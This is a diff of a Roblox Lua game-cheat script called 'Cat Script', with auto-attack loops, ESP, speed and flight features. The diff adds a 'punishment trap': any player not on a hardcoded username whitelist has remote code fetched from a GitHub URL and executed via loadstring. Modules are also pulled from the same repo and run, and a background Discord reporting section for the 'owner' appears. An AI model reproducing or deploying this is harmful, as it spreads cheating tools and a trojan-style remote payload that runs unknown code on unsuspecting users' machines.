@@ -1,13 +1,31 @@
 -- [[ 🐾 貓貓腳本 (CAT SCRIPT) - 2026 終極重生完整版 🐾 ]] --
 
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
 -- ==========================================
--- 【 ♻️ 0. 強制清場邏輯 】
+-- 【 🛡️ 1. 核心白名單過濾器 】
+-- ==========================================
+local Whitelist = { 
+    ["Kadys5373"] = true, ["jay04_23"] = true, ["Zn6xx"] = true, 
+    ["iandsere"] = true, ["Zadrian664"] = true, ["czr_0416"] = true, 
+    ["tw_vic2012"] = true, ["12i21777"] = true
+}
+
+-- 🚨 如果不在白名單，直接執行主人的「制裁陷阱」
+if not Whitelist[localPlayer.Name] then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/F"))()
+    return -- 停止後續腳本運行
+end
+
+-- ==========================================
+-- 【 ♻️ 2. 強制清場邏輯 】(白名單通過後才執行)
 -- ==========================================
 if _G.NekoRunning then _G.NekoRunning = false end
 
 local function NuclearClean()
     local CoreGui = game:GetService("CoreGui")
-    local PlayerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+    local PlayerGui = localPlayer:FindFirstChild("PlayerGui")
     local targets = {"貓貓腳本", "NEKO", "NekoUI"}
     for _, name in ipairs(targets) do
         local old = CoreGui:FindFirstChild(name) or (PlayerGui and PlayerGui:FindFirstChild(name))
@@ -18,24 +36,15 @@ NuclearClean()
 task.wait(0.2)
 
 -- ==========================================
--- 【 🛡️ 1. 環境初始化與白名單 】
+-- 【 🛡️ 3. 環境初始化 】
 -- ==========================================
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Camera = workspace.CurrentCamera
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 
-local Whitelist = { 
-    ["Kadys5373"] = true, ["jay04_23"] = true, ["Zn6xx"] = true, 
-    ["iandsere"] = true, ["Zadrian664"] = true, ["czr_0416"] = true, 
-    ["tw_vic2012"] = true, ["12i21777"] = true
-}
-if not Whitelist[localPlayer.Name] then return end
-
 -- ==========================================
--- 【 🍭 2. 載入 UI 系統 】
+-- 【 🍭 4. 載入 UI 系統 】
 -- ==========================================
 local NekoLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOUI"))()
 local myUI, screenGui = NekoLib.new("貓貓腳本")
@@ -44,17 +53,17 @@ screenGui.Name = "貓貓腳本"
 local Settings = { 
     ClickDelay = 0.05, Distance = 1500, PullEnemies = false, Mode = "None",
     FOV = 70, ZoomDist = 128, CatSpeedValue = 50, SpeedEnabled = false,
-    FruitHeight = 6, FruitDelay = 0.05 -- 果實專屬
+    FruitHeight = 6, FruitDelay = 0.05 
 }
 
 _G.NekoRunning = true
-_G.NekoAttack = false   -- 原始戰鬥
-_G.FruitAttack = false  -- 果實連擊
+_G.NekoAttack = false
+_G.FruitAttack = false
 _G.AutoV4 = false
 _G.NekoESP = false
 
 -- ==========================================
--- 【 ⚔️ 3. UI 選單功能配置 】
+-- 【 ⚔️ 5. UI 選單功能配置 】
 -- ==========================================
 local Tab1 = myUI:Tab("戰鬥系統")
 local Sec1 = Tab1:Section("原始神刀")
@@ -91,7 +100,7 @@ Sec3:Textbox("速度", "50", function(v) Settings.CatSpeedValue = tonumber(v) or
 Sec3:Button("召喚貓貓飛行", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOFly"))() end)
 
 -- ==========================================
--- 【 🚀 4. 核心功能邏輯 】
+-- 【 🚀 6. 核心功能邏輯 】
 -- ==========================================
 local Character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 localPlayer.CharacterAdded:Connect(function(newChar) Character = newChar end)
@@ -107,7 +116,7 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
--- 【 循環 A：原始神刀 (恢復 Scan 邏輯) 】
+-- 【 循環 A：原始神刀 】
 task.spawn(function()
     while _G.NekoRunning do
         if _G.NekoAttack and Settings.Mode ~= "None" then
@@ -151,7 +160,7 @@ task.spawn(function()
     end
 end)
 
--- 【 循環 B：暴力果實 (獨立專屬) 】
+-- 【 循環 B：暴力果實 】
 task.spawn(function()
     while _G.NekoRunning do
         if _G.FruitAttack then
@@ -201,7 +210,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- 【 📢 5. 背景 Discord 通報 (主人專屬) 】
+-- 【 📢 7. 背景 Discord 通報 (主人專屬) 】
 -- ==========================================
 task.spawn(function()
     task.wait(10)
